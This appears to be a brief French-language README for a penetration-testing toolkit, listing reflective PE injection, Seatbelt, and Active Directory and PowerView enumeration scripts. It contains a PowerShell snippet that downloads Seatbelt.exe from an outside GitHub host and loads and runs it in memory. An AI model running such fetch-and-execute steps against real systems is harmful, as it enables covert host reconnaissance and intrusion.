# Custom Tools

**Invoke-ReflectivePEInjection.ps1**
Patch pour fonctionner sur tous les systèmes windows

**seatbelt**
Class en public pour charger l'assembly directement en mémoire

```
$url = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe"
$x = (New-Object System.Net.WebClient).downloadData($url)
$xa = [System.Reflection.Assembly]::Load($x)
[Seatbelt.Program]::Main(@("-group=all", "-full"))
```

**AD-Enumeration.ps1**


**Powerview-Enumeration.ps1**